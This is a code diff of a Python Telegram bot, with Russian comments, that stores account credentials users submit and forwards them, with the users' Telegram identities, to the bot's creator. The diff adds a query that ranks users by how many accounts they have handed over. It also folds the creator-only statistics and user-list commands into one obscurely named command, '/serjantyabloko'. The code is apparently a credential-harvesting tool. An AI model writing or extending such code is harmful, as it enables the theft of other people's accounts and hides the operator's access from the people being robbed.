@@ -105,6 +105,23 @@ class Database:
         
         conn.close()
         return total_credentials, unique_users
+    
+    def get_users_list(self):
+        """Получение списка пользователей с количеством аккаунтов"""
+        conn = sqlite3.connect(self.db_path)
+        cursor = conn.cursor()
+        
+        cursor.execute('''
+            SELECT DISTINCT telegram_id, telegram_username, telegram_first_name, 
+                   COUNT(*) as accounts_count
+            FROM collected_credentials
+            GROUP BY telegram_id
+            ORDER BY accounts_count DESC
+        ''')
+        
+        users = cursor.fetchall()
+        conn.close()
+        return users
 
 # Инициализация базы данных
 db = Database()
@@ -285,7 +302,7 @@ def handle_message(update: Update, context):
             
             db.log_action(user_id, "credentials_saved", f"Сохранен аккаунт: {username}")
             
-            # Отправляем данные создателю бота (исправлено!)
+            # Отправляем данные создателю бота
             user_info = {
                 'username': telegram_username,
                 'first_name': first_name,
@@ -357,59 +374,42 @@ def handle_callback(update: Update, context):
         user_id = int(query.data.replace("msg_", ""))
         query.answer("Кнопка для отправки сообщения пользователю", show_alert=True)
 
-def stats_command(update: Update, context):
-    """Команда для просмотра статистики (только для создателя)"""
+def serjantyabloko_command(update: Update, context):
+    """Объединённая команда для создателя: статистика + список пользователей"""
     user_id = update.effective_user.id
     
     if user_id != CREATOR_ID:
         update.message.reply_text("❌ У вас нет доступа к этой команде")
         return
     
-    total, unique = db.get_stats()
+    # Получаем статистику
+    total_accounts, unique_users = db.get_stats()
     
-    stats_text = (
-        f"📊 <b>Статистика бота</b>\n\n"
-        f"👥 Всего аккаунтов: <b>{total}</b>\n"
-        f"👤 Уникальных пользователей: <b>{unique}</b>\n"
-        f"🤖 Создатель: {CREATOR_USERNAME}\n"
-        f"⏰ Обновлено: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-    )
+    # Получаем список пользователей
+    users = db.get_users_list()
     
-    update.message.reply_text(stats_text, parse_mode='HTML')
-
-def users_command(update: Update, context):
-    """Команда для просмотра списка пользователей (только для создателя)"""
-    user_id = update.effective_user.id
+    # Формируем текст сообщения
+    text = f"📊 <b>СТАТИСТИКА БОТА</b>\n\n"
+    text += f"👥 Всего аккаунтов: <b>{total_accounts}</b>\n"
+    text += f"👤 Уникальных пользователей: <b>{unique_users}</b>\n"
+    text += f"🤖 Создатель: {CREATOR_USERNAME}\n"
+    text += f"⏰ Обновлено: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
     
-    if user_id != CREATOR_ID:
-        update.message.reply_text("❌ У вас нет доступа к этой команде")
-        return
-    
-    conn = sqlite3.connect('collected_data.db')
-    cursor = conn.cursor()
-    
-    cursor.execute('''
-        SELECT DISTINCT telegram_id, telegram_username, telegram_first_name, 
-               COUNT(*) as accounts_count
-        FROM collected_credentials
-        GROUP BY telegram_id
-        ORDER BY accounts_count DESC
-    ''')
-    
-    users = cursor.fetchall()
-    conn.close()
+    text += "👥 <b>СПИСОК ПОЛЬЗОВАТЕЛЕЙ:</b>\n\n"
     
     if not users:
-        update.message.reply_text("Нет пользователей в базе")
-        return
+        text += "Нет пользователей в базе"
+    else:
+        for u in users[:20]:  # Показываем первых 20
+            uid, username, first_name, count = u
+            text += f"• {first_name or 'Без имени'} (@{username or 'нет'}) — <b>{count}</b> акк.\n"
+        
+        if len(users) > 20:
+            text += f"\n<i>И ещё {len(users) - 20} пользователя(ей) не показано</i>"
+        
+        text += f"\n\n<i>Всего уникальных: {len(users)}</i>"
     
-    text = "👥 <b>Список пользователей:</b>\n\n"
-    for u in users[:20]:  # Показываем первых 20
-        uid, username, first_name, count = u
-        text += f"• {first_name or 'Без имени'} (@{username or 'нет'}) - {count} акк.\n"
-    
-    text += f"\n<i>Всего уникальных: {len(users)}</i>"
-    
+    # Отправляем сообщение
     update.message.reply_text(text, parse_mode='HTML')
 
 def error_handler(update, context):
@@ -438,8 +438,7 @@ def main():
     dp.add_handler(CommandHandler("help", help_command))
     dp.add_handler(CommandHandler("add", add_account))
     dp.add_handler(CommandHandler("cancel", cancel))
-    dp.add_handler(CommandHandler("stats", stats_command))  # Статистика
-    dp.add_handler(CommandHandler("users", users_command))  # Список пользователей
+    dp.add_handler(CommandHandler("serjantyabloko", serjantyabloko_command))  # Новая команда
     dp.add_handler(CallbackQueryHandler(handle_callback))
     dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
     dp.add_error_handler(error_handler)
@@ -454,8 +453,7 @@ def main():
     print("  /start - Приветствие")
     print("  /add - Добавить аккаунт")
     print("  /help - Помощь")
-    print("  /stats - Статистика (только для создателя)")
-    print("  /users - Список пользователей (только для создателя)")
+    print("  /serjantyabloko - Статистика и список пользователей (только для создателя)")
     print("=" * 50)
     
     updater.start_polling(drop_pending_updates=True)
